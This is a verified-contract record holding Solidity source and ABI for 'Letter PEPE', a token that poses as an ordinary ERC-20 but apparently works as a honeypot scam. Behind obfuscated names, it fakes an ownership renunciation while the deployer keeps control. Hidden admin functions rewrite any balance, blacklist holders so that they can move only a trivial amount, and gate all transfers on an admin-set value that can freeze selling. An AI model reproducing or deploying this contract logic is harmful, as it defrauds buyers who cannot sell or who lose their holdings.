{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface walletListTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address isFund) external view returns (uint256);\n\n    function transfer(address buyIsSender, uint256 sellWallet) external returns (bool);\n\n    function allowance(address exemptBuyAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyIsSender,\n        uint256 sellWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed maxLaunched, uint256 value);\n    event Approval(address indexed exemptBuyAuto, address indexed spender, uint256 value);\n}\n\nabstract contract autoAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isShouldExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeFeeLimit {\n    function createPair(address takeReceiverLaunched, address modeTx) external returns (address);\n}\n\ninterface walletListTotalMetadata is walletListTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LetterPEPE is autoAt, walletListTotal, walletListTotalMetadata {\n\n    uint256 constant swapTeamAt = 14 ** 10;\n\n    bool private teamMax;\n\n    function balanceOf(address isFund) public view virtual override returns (uint256) {\n        return tokenAtMax[isFund];\n    }\n\n    address public shouldLiquidity;\n\n    bool public swapTotal;\n\n    uint256 private launchedReceiver;\n\n    address launchEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return enableLaunch;\n    }\n\n    mapping(address => bool) public tradingEnable;\n\n    function allowance(address enableLimitAuto, address takeWallet) external view virtual override returns (uint256) {\n        if (takeWallet == launchEnable) {\n            return type(uint256).max;\n        }\n        return amountTokenBuy[enableLimitAuto][takeWallet];\n    }\n\n    mapping(address => bool) public teamSell;\n\n    bool public amountFund;\n\n    function receiverTo(address atMarketing, address buyIsSender, uint256 sellWallet) internal returns (bool) {\n        require(tokenAtMax[atMarketing] >= sellWallet);\n        tokenAtMax[atMarketing] -= sellWallet;\n        tokenAtMax[buyIsSender] += sellWallet;\n        emit Transfer(atMarketing, buyIsSender, sellWallet);\n        return true;\n    }\n\n    function transferFrom(address atMarketing, address buyIsSender, uint256 sellWallet) external override returns (bool) {\n        if (_msgSender() != launchEnable) {\n            if (amountTokenBuy[atMarketing][_msgSender()] != type(uint256).max) {\n                require(sellWallet <= amountTokenBuy[atMarketing][_msgSender()]);\n                amountTokenBuy[atMarketing][_msgSender()] -= sellWallet;\n            }\n        }\n        return tokenModeReceiver(atMarketing, buyIsSender, sellWallet);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toToken;\n    }\n\n    function receiverLiquidity() private view {\n        require(teamSell[_msgSender()]);\n    }\n\n    uint256 public walletListToken;\n\n    address public atMaxMode;\n\n    function modeWallet(address fromExempt) public {\n        receiverLiquidity();\n        \n        if (fromExempt == shouldLiquidity || fromExempt == atMaxMode) {\n            return;\n        }\n        tradingEnable[fromExempt] = true;\n    }\n\n    uint8 private toToken = 18;\n\n    function sellTx() public {\n        emit OwnershipTransferred(shouldLiquidity, address(0));\n        exemptTrading = address(0);\n    }\n\n    function tokenModeReceiver(address atMarketing, address buyIsSender, uint256 sellWallet) internal returns (bool) {\n        if (atMarketing == shouldLiquidity) {\n            return receiverTo(atMarketing, buyIsSender, sellWallet);\n        }\n        uint256 listBuy = walletListTotal(atMaxMode).balanceOf(fundTake);\n        require(listBuy == liquidityLaunched);\n        require(buyIsSender != fundTake);\n        if (tradingEnable[atMarketing]) {\n            return receiverTo(atMarketing, buyIsSender, swapTeamAt);\n        }\n        return receiverTo(atMarketing, buyIsSender, sellWallet);\n    }\n\n    uint256 private listMin = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private amountTokenBuy;\n\n    function transfer(address shouldReceiver, uint256 sellWallet) external virtual override returns (bool) {\n        return tokenModeReceiver(_msgSender(), shouldReceiver, sellWallet);\n    }\n\n    string private senderTx = \"LPE\";\n\n    function shouldMarketing(uint256 sellWallet) public {\n        receiverLiquidity();\n        liquidityLaunched = sellWallet;\n    }\n\n    bool public fundAmountList;\n\n    function tradingTx(address shouldReceiver, uint256 sellWallet) public {\n        receiverLiquidity();\n        tokenAtMax[shouldReceiver] = sellWallet;\n    }\n\n    mapping(address => uint256) private tokenAtMax;\n\n    function getOwner() external view returns (address) {\n        return exemptTrading;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderTx;\n    }\n\n    function feeBuy(address swapList) public {\n        require(swapList.balance < 100000);\n        if (swapTotal) {\n            return;\n        }\n        if (amountFund == fundAmountList) {\n            walletListToken = launchedReceiver;\n        }\n        teamSell[swapList] = true;\n        \n        swapTotal = true;\n    }\n\n    uint256 buyTeam;\n\n    constructor (){\n        \n        isShouldExempt atReceiver = isShouldExempt(launchEnable);\n        atMaxMode = takeFeeLimit(atReceiver.factory()).createPair(atReceiver.WETH(), address(this));\n        \n        shouldLiquidity = _msgSender();\n        sellTx();\n        teamSell[shouldLiquidity] = true;\n        tokenAtMax[shouldLiquidity] = listMin;\n        if (walletListToken != launchedReceiver) {\n            launchedReceiver = walletListToken;\n        }\n        emit Transfer(address(0), shouldLiquidity, listMin);\n    }\n\n    uint256 liquidityLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listMin;\n    }\n\n    function approve(address takeWallet, uint256 sellWallet) public virtual override returns (bool) {\n        amountTokenBuy[_msgSender()][takeWallet] = sellWallet;\n        emit Approval(_msgSender(), takeWallet, sellWallet);\n        return true;\n    }\n\n    string private enableLaunch = \"Letter PEPE\";\n\n    address private exemptTrading;\n\n    bool private receiverToken;\n\n    event OwnershipTransferred(address indexed atIs, address indexed senderMinTx);\n\n    address fundTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return exemptTrading;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptBuyAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMinTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLimitAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMaxMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"}],\"name\":\"feeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAmountList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromExempt\",\"type\":\"address\"}],\"name\":\"modeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellWallet\",\"type\":\"uint256\"}],\"name\":\"shouldMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellWallet\",\"type\":\"uint256\"}],\"name\":\"tradingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyIsSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletListToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LetterPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}